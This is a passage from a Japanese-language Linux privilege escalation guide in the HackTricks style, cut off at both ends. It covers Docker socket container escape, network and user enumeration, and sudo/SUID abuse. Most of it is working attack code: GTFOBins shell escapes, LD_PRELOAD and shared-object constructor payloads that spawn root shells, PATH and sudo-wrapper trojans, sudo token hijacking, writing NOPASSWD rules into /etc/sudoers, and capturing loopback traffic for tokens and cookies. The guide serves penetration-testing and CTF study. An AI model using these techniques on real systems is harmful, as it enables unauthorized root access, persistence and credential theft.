curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後、ホストのファイルシステムに対して root 権限でアクセスできるコンテナ内で直接コマンドを実行できます。

### Others

docker socket に対して書き込み権限がある（つまり **グループ `docker` のメンバーである**）場合、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が利用できます。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) であれば、それを悪用して侵害できる可能性もあります。

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 権限昇格

もし **`ctr`** コマンドを使用できる場合、以下のページを参照してください（悪用して権限昇格できる可能性があります）:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 権限昇格

もし **`runc`** コマンドを使用できる場合、以下のページを参照してください（悪用して権限昇格できる可能性があります）:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度なプロセス間通信（IPC）システムであり、アプリケーションが効率的に相互作用しデータを共有できるようにします。現代の Linux システムを念頭に設計されており、さまざまな形態のアプリケーション間通信に対して堅牢なフレームワークを提供します。

このシステムは柔軟性が高く、プロセス間のデータ交換を強化する基本的な IPC をサポートし、強化された UNIX ドメインソケットを思わせる機能を有します。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信通知のシグナルが音楽プレーヤーにミュートさせるよう促す、といったユーザー体験の向上が可能です。また、D-Bus はリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は許可/拒否モデルで動作し、マッチするポリシールールの累積効果に基づいてメッセージの権限（メソッド呼び出し、シグナルの送出など）を管理します。これらのポリシーはバスとのやり取りを指定しており、これらの権限を悪用することで権限昇格につながる可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるそのようなポリシーの例が示されており、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、そのメッセージを送受信する権限が詳細に記述されています。

ユーザーやグループが指定されていないポリシーはすべてに適用され、一方で "default" コンテキストのポリシーは他の特定のポリシーでカバーされていないものすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus communication を enumerate して exploit する方法を学べます:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate して、そのマシンの位置を把握するのは常に興味深い。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### アウトバウンドフィルタリングの簡易トリアージ

ホストがコマンドを実行できるが callbacks が失敗する場合、DNS、transport、proxy、route のフィルタリングを素早く切り分ける:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

必ず、アクセスする前には対話できなかったマシン上で実行中の network services を確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
リスナーを bind target で分類:

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開される。
- `127.0.0.1` / `::1`: ローカル限定（tunnel/forward の候補として良い）。
- 特定の内部IP（例: `10.x`, `172.16/12`, `192.168.x`, `fe80::`）: 通常は内部セグメントからのみ到達可能。

### ローカル限定サービスのトリアージワークフロー

ホストを compromise すると、`127.0.0.1` にバインドされたサービスがあなたの shell から初めて到達可能になることがよくある。簡単なローカルワークフローは次のとおり：
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as a network scanner (network-only mode)

ローカルの PE チェックに加えて、linPEAS はフォーカスされたネットワークスキャナとして実行できます。`$PATH` にある利用可能なバイナリ（通常 `fping`, `ping`, `nc`, `ncat`）を使用し、ツールをインストールしません。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS behaves as a pure network scanner (skipping the rest of privilege-escalation checks).

### Sniffing

sniff traffic が可能か確認してください。可能なら、いくつかの credentials を入手できるかもしれません。
```
timeout 1 tcpdump
```
簡単な実践チェック:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) は post-exploitation において特に有用です。多くの内部専用サービスが tokens/cookies/credentials をそこに公開しているため:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
今すぐキャプチャして、後で解析する:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## ユーザー

### 一般的な列挙

自分が**誰**であるか、どの**privileges**を持っているか、システム内にどの**users**がいるか、どの**users**が**login**できるか、どの**users**が**root privileges**を持っているかを確認してください:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限を昇格できるバグの影響を受けていました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**悪用するには**: **`systemd-run -t /bin/bash`**

### Groups

root 権限を与える可能性のある**グループのメンバー**かどうか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

可能であれば、クリップボード内に興味深い内容がないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**パスワードを知っている場合**は、そのパスワードを使って**各ユーザーにログインを試みてください**。

### Su Brute

多くのノイズを出すことを気にしない場合、対象のコンピュータに`su`と`timeout`バイナリが存在すれば、[su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーへのブルートフォースも試みます。

## 書き込み可能な PATH の悪用

### $PATH

もし **$PATH のいずれかのフォルダに書き込める** ことが分かれば、別ユーザー（理想は root）が実行するコマンドと同じ名前の backdoor を **書き込み可能なフォルダ内に作成する** ことで権限昇格できる可能性があります。ただし、それが **$PATH 内であなたの書き込み可能フォルダより前に位置するフォルダからロードされない** ことが条件です。

### SUDO and SUID

sudo で実行が許可されているコマンドがあるか、あるいは suid ビットが設定されているコマンドがあるかもしれません。次のように確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**予期しないコマンドは、ファイルの読み取りや書き込み、さらにはコマンドの実行さえ可能にします。**例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によっては、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できることがあります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できるため、root ディレクトリに ssh キーを追加するか `sh` を呼び出すことで、簡単にシェルを取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、ユーザーが何かを実行する際に**環境変数を設定する**ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirerに基づく**もので、スクリプトがrootとして実行される際に任意のpythonライブラリをロードする**PYTHONPATH hijacking**に対して**脆弱**でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep によって保持され → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- なぜ動くか: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、対象スクリプトを実行する前にそのファイルを source（読み込み）します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。sudo によって `BASH_ENV` が保持されていれば、あなたのファイルが root 権限で source されます。

- 要件:
- 実行可能な sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を優先する。
- sudo で許可されたコマンドのためのシェルラッパーは避け、最小限のバイナリを使用する。
- 環境変数が保持されている場合の sudo の I/O ロギングやアラートを検討する。

### Terraform via sudo with preserved HOME (!env_reset)

If sudo leaves the environment intact (`!env_reset`) while allowing `terraform apply`, `$HOME` stays as the calling user. Terraform therefore loads **$HOME/.terraformrc** as root and honors `provider_installation.dev_overrides`.

- 必要な provider を書き込み可能なディレクトリに向け、プロバイダー名に合わせた悪意あるプラグイン（例: `terraform-provider-examples`）を配置する：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
TerraformはGo pluginのハンドシェイクに失敗するが、終了する前にペイロードをrootで実行し、SUID shellを残す。

### TF_VAR オーバーライド + symlink 検証バイパス

Terraformの変数は`TF_VAR_<name>`環境変数で提供でき、sudoが環境を保持する場合に引き継がれる。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`のような弱い検証は、symlinkでバイパスできる：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraformはsymlinkを解決し、実際の`/root/root.txt`を攻撃者が読み取れる先にコピーします。同じ手法は、宛先のsymlinkを事前に作成することで（例えばproviderの宛先パスを`/etc/cron.d/`内に向けるなどして）特権パスへ**write**するためにも使用できます。

### requiretty / !requiretty

一部の古いディストリビューションでは、sudoは`requiretty`で設定され、sudoが対話的なTTYからのみ実行されるよう強制されます。`!requiretty`が設定されている場合（またはオプションが存在しない場合）、sudoはreverse shells、cron jobs、またはscriptsなどの非対話的なコンテキストから実行できます。
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

もし `sudo -l` が `env_keep+=PATH` を表示するか、攻撃者が書き込み可能なエントリ（例：`/home/<user>/bin`）を含む `secure_path` が設定されている場合、sudoで許可されたターゲット内の相対パスで呼ばれるコマンドは上書きされる可能性があります。

- 要件: sudoルール（しばしば `NOPASSWD`）で、絶対パスを使わずにコマンド（`free`, `df`, `ps` など）を呼び出すスクリプト/バイナリが実行され、かつ先に検索される書き込み可能な PATH エントリが存在すること。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 実行でパスをバイパス
**ジャンプ**して他のファイルを読んだり、**symlinks** を使います。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使われている（\*）、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudoコマンド/SUIDバイナリ（コマンドのパスが指定されていない場合）

もし単一のコマンドに**sudo permission**が与えられ、**パスが指定されていない**場合: _hacker10 ALL= (root) less_、PATH variable を変更することでこれを悪用できます
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリがパスを指定せずに別のコマンドを実行する場合にも使えます（奇妙な SUID バイナリの内容は常に _**strings**_ で確認してください）。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリでコマンドのパスが指定されている場合

もし **suid** バイナリが**パスを指定して別のコマンドを実行している**場合、suid ファイルが呼び出しているコマンド名で **export a function** を試すことができます。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、関数を作成してエクスポートする必要があります:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid binary を呼び出すと、この関数が実行されます

### 書き込み可能なスクリプトがSUID wrapperによって実行される

一般的なカスタムアプリの設定ミスとして、root-owned SUID binary wrapper がスクリプトを実行するが、そのスクリプト自体は low-priv users によって書き込み可能である、というものがあります。

典型的なパターン:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
もし `/usr/local/bin/backup.sh` が書き込み可能であれば、payload コマンドを追記してから SUID ラッパーを実行できます:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
クイックチェック:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

しかし、この機能が悪用されるのを防ぎ、特に **suid/sgid** 実行ファイルに対してシステムのセキュリティを維持するために、システムはいくつかの条件を強制します:

- ローダは、実ユーザーID（_ruid_）が効果ユーザーID（_euid_）と一致しない実行ファイルに対しては **LD_PRELOAD** を無視します。
- **suid/sgid** の実行ファイルの場合、プリロードされるのは標準パス内でかつ **suid/sgid** であるライブラリのみです。

Privilege escalation は、`sudo` でコマンドを実行する権限があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この設定により、`sudo` 実行時にも **LD_PRELOAD** 環境変数が保持され認識され、結果として特権で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
保存先: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**compile it** を使用してコンパイルします:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行する
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合、同様の privesc を悪用できます。攻撃者はライブラリが検索されるパスを制御するためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常と異なるように見える**SUID**権限を持つbinaryに遭遇した場合、**.so**ファイルを適切に読み込んでいるかどうかを確認するのが良い習慣です。これは以下のコマンドを実行して確認できます：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、エクスプロイトの可能性が示唆されます。

これをエクスプロイトするには、例えば _"/path/to/.config/libcalc.c"_ という Cファイルを作成し、以下のコードを記述します:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作し、特権を持つ shell を実行することで権限を昇格させることを目的としています。

上記の C file を shared object (.so) ファイルにコンパイルするには、次のコマンドを使用します:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受ける SUID binary を実行すると、exploit がトリガーされ、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID binary が書き込み可能なフォルダからライブラリをロードしていることがわかったので、そのフォルダに必要な名前でライブラリを作成します:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリは `a_function_name` という関数を持っている必要があります。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリのキュレーションリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに対して **引数のみを注入できる** 場合の事例を扱っています。

このプロジェクトは、Unix バイナリの正当な機能の中から、制限されたシェルの脱出、特権の昇格または維持、ファイル転送、bind や reverse シェルの生成、その他のポストエクスプロイテーション作業を容易にするために悪用できるものを収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

もし `sudo -l` にアクセスできるなら、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、任意の sudo ルールを悪用する方法が見つかるかどうかを確認できます。

### Reusing Sudo Tokens

パスワードを知らないが **sudo access** を持っている場合、**sudo コマンドの実行を待ってセッショントークンをハイジャックする**ことで特権を昇格できます。

Requirements to escalate privileges:

- 既にユーザー _sampleuser_ としてシェルを持っている
- _sampleuser_ は **過去 15 分以内に `sudo` を使用して** 何かを実行している（デフォルトでは、パスワードを入力せずに `sudo` を使用できる sudo トークンの有効期間がこれに相当します）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 である
- `gdb` が利用可能である（アップロードできること）

(一時的に `ptrace_scope` を有効にするには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を、恒久的にするには `/etc/sysctl.d/10-ptrace.conf` を修正して `kernel.yama.ptrace_scope = 0` を設定します)

もしこれらの要件がすべて満たされている場合、**次のツールを使用して特権を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使って **あなたのセッションで sudo トークンを有効化** できます（自動的に root シェルは得られません。`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- この **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に **root が所有し setuid が付与された** sh shell を作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **third exploit** (`exploit_v3.sh`) は **create a sudoers file** を作成し、**sudo tokens eternal and allows all users to use sudo** にします。
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダまたはフォルダ内に作成されたファイルのいずれかに対して**書き込み権限**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使用して**ユーザーとPIDのsudoトークンを作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、PID 1234 のそのユーザーとしてシェルを持っている場合、パスワードを知らずに次のようにして**sudo 権限を取得**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` をどのように使えるかを設定します。これらのファイルは**デフォルトでは user root と group root のみが読み取り可能**です。\
**もし**このファイルを**読む**ことができれば、**いくつかの興味深い情報を取得できる**可能性があり、また任意のファイルを**書き込む**ことができれば、**escalate privileges** が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込み権限があれば、それを悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として OpenBSD 用の `doas` などが存在します。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

特定の **ユーザが通常マシンに接続し `sudo` を使用する** と分かっていて、そのユーザコンテキスト内でシェルを得ている場合、**新しい sudo 実行可能ファイルを作成する**ことでまずあなたのコードを root として実行し、その後ユーザのコマンドを実行させることができます。次に、ユーザコンテキストの **$PATH を修正**（例えば新しいパスを .bash_profile に追加）しておけば、ユーザが sudo を実行した際にあなたの sudo 実行可能ファイルが実行されます。

ユーザが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために他のファイルを変更する必要がある点に注意してください。例えば [sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

あるいは次のようなコマンドを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次の行が含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` にある設定ファイルが読み込まれます。この設定ファイルは、**他のフォルダ**を指し、そこで**ライブラリ**が**検索されます**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` 内でライブラリを検索します**。

何らかの理由で、指定されたパス（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` に記載された設定ファイル内の任意のフォルダ）に対して**ユーザが書き込み権限を持っている**場合、権限昇格が可能になることがあります.\ 以下のページで、このミスコンフィギュレーションを**どのように悪用するか**を確認してください:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されているとおり、その場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使って /var/tmp に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

